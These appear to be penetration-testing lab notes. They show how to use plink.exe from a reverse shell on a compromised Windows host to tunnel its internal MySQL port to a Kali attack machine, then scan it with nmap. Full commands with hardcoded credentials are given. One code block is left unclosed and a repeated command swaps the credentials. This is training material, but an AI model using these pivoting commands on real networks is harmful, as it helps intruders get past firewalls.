During the enumeration and information gathering process, we discover a MySQL service running on TCP port 3306.

```powershell
C:\Windows\system32>netstat -anpb TCP
netstat -anpb TCP

```

We would like to scan this database or interact with the service. However, because of the firewall, we cannot directly interact with this service from our Kali machine.

We will transfer [plink.exe](http://the.earth.li/~sgtatham/putty/0.53b/htmldoc/Chapter7.html), a Windows-based command line SSH client (part of the PuTTY project) to the target to overcome this limitation. The program syntax is similar to the UNIX-based ssh client:

```powershell
C:\Tools\port_redirection_and_tunneling> plink.exe
plink.exe
Plink: command-line connection utility
Release 0.70
Usage: plink [options] [user@]host [command]
       ("host" can also be a PuTTY saved session name)
Options:
  -V        print version information and exit
  -pgpfp    print PGP key fingerprints and exit
  -v        show verbose messages
  -load sessname  Load settings from saved session
  -ssh -telnet -rlogin -raw -serial
            force use of a particular protocol
  -P port   connect to specified port
  -l user   connect with specified username
  -batch    disable all interactive prompts
  -proxycmd command
            use 'command' as local proxy
  -sercfg configuration-string (e.g. 19200,8,n,1,X)
            Specify the serial configuration (serial only)
The following options only apply to SSH connections:
  -pw passw login with specified password
  -D [listen-IP:]listen-port
            Dynamic SOCKS-based port forwarding
  -L [listen-IP:]listen-port:host:port
            Forward local port to remote address
  -R [listen-IP:]listen-port:host:port
            Forward remote port to local address
  -X -x     enable / disable X11 forwarding
  -A -a     enable / disable agent forwarding
  -t -T     enable / disable pty allocation
...
```

We can use plink.exe to connect via SSH (-ssh) to our Kali machine (10.11.0.4) as the kali user (-l kali) with a password of "ilak" (-pw ilak) to create a remote port forward (-R) of port 1234 (10.11.0.4:1234) to the MySQL port on the Windows target (127.0.0.1:3306) with the following command:

```powershell
C:\Tools\port_redirection_and_tunneling> plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
```

The first time plink connects to a host, it will attempt to cache the host key in the registry. If we run the command through an rdesktop connection to the Windows client, we can see this interactive step:

![Plink-sh](/assets/img/Pasted-image-20230503172914.png)

However, since this will most likely not work with the interactivity level we have in a typical reverse shell, we should pipe the answer to the prompt with the cmd.exe /c echo y command. From our reverse shell, then, this command will successfully establish the remote port forward without any interaction:

```powershell
C:\Tools\port_redirection_and_tunneling> cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
cmd.exe /c echo y | plink.exe -ssh -l root -pw toor -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4

Now that our tunnel is active, we can attempt to launch an Nmap scan of the target's MySQL port via our localhost port forward on TCP port 1234:

```bash
kali@kali:~$ sudo nmap -sS -sV 127.0.0.1 -p 1234

Starting Nmap 7.60 ( https://nmap.org ) at 2019-04-20 05:00 EEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00026s latency).

PORT     STATE SERVICE VERSION
1234/tcp open  mysql   MySQL 5.5.5-10.1.31-MariaDB

Nmap done: 1 IP address (1 host up) scanned in 0.93 seconds
```

The setup seems to be working. We have successfully scanned the Windows 10 machine's SQL service through a remote port forward on our Kali attack machine.
